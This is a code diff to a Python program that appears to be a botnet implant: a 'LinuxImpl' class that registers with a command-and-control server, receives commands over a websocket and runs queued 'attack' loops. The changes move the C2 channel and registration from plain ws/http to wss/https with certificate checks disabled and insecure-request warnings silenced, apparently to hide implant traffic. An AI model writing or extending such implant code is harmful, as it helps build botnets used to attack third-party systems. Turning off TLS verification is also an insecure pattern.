@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import asyncio
 import json
+import shlex
 import subprocess
 import signal
 import sys
@@ -10,15 +11,29 @@ import socket
 import random
 import threading
 import time
-import uuid
 import re
 import platform
 import netifaces
+import ssl
+from requests.adapters import HTTPAdapter
+from urllib3.util.ssl_ import create_urllib3_context
+import urllib3
 from websockets import connect
 from websockets.exceptions import ConnectionClosedError, ConnectionClosedOK
 from typing import List, Dict, Tuple, Optional
 import requests
-import shlex
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+class SSLAdapter(HTTPAdapter):
+    def init_poolmanager(self, *args, **kwargs):
+        ctx = create_urllib3_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        kwargs['ssl_context'] = ctx
+        return super().init_poolmanager(*args, **kwargs)
+
 
 
 class LinuxImpl:
@@ -59,18 +74,22 @@ class LinuxImpl:
         delay = min(5 * (2 ** (self.retry_count - 1)), self.max_retry_delay)
         await asyncio.sleep(delay)
 
+
     async def _connect_to_c2(self) -> None:
         try:
+            ssl_context = ssl.create_default_context()
+            ssl_context.check_hostname = False
+            ssl_context.verify_mode = ssl.CERT_NONE
             
             async with connect(
-                f"ws://{self.c2_ws_url}/api/rcv?id={self.impl_id}",
+                f"wss://{self.c2_ws_url}/api/rcv?id={self.impl_id}",
                 ping_interval=20,
                 ping_timeout=10,
                 close_timeout=10,
-                open_timeout=30
+                open_timeout=30,
+                ssl=ssl_context 
             ) as ws:
                 self.retry_count = 0  
-                
                 
                 while self.running:
                     try:
@@ -82,6 +101,7 @@ class LinuxImpl:
                         
         except Exception as e:
             raise
+
 
     async def _handle_commands(self, ws) -> None:
         try:
@@ -512,7 +532,10 @@ class LinuxImpl:
                         attack['loop']
                     )
     
+   
+    
     async def register(self) -> bool:
+       
         model = {
             'impl_mac': self._get_macs(),
             'group': self.group,
@@ -522,19 +545,30 @@ class LinuxImpl:
             'impl_id': self.impl_id
         }
 
+        
+        session = requests.Session()
+        session.mount('https://', SSLAdapter())
+
         max_attempts = 3
+
         for attempt in range(max_attempts):
+            if attempt < max_attempts - 1:
+                await asyncio.sleep(1)
             try:
-                req = requests.post(f"http://{self.c2_ws_url}/api/impl/new/{model['impl_id']}", 
-                                   data=model, timeout=10)
+                req = session.post(
+                    f"https://{self.c2_ws_url}/api/impl/new/{model['impl_id']}",
+                    data=model,
+                    timeout=10,
+                    verify=False 
+                )
+
                 if req.status_code == 200:
                     return True
                 else:
                     return False
             except Exception as e:
+
                 return False 
-            if attempt < max_attempts - 1:
-                await asyncio.sleep(3)
         
         return False
 
@@ -606,10 +640,12 @@ class LinuxImpl:
         sys.exit(1)
 
 if __name__ == "__main__":
-
     
     C2_WS_URL = "localhost:4444"
     GROUP_NAME = "grupo"
+    
+
+
     
     impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
     
@@ -625,4 +661,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         impl.running = False
     except Exception as e:
-        raise       
+        raise        
